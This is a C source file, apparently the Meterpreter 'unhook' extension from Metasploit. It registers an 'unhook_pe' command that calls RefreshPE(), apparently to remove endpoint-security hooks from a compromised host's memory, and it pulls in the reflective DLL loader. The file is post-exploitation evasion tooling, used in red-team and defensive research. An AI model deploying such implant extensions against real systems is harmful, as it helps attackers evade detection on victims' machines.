/*!
 * @file unhook.c
 * @brief Entry point and intialisation functionality for the unhook extention.
 */
#include "common.h"
#include "common_metapi.h"

// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "unhook.h"
#include "refresh.h"

// Required so that use of the API works.
MetApi* met_api = NULL;


DWORD unhook_pe(Remote *remote, Packet *packet);

Command customCommands[] =
{
	// custom commands go here
	COMMAND_REQ("unhook_pe", unhook_pe),

	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param api Pointer to the Meterpreter API structure.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(MetApi* api, Remote *remote)
{
    met_api = api;

	met_api->command.register_all( customCommands );

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	met_api->command.deregister_all( customCommands );

	return ERROR_SUCCESS;
}


DWORD unhook_pe(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	
	RefreshPE();

	met_api->packet.add_tlv_uint(response, TLV_TYPE_UNHOOK_RESPONSE, ERROR_SUCCESS);
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;

}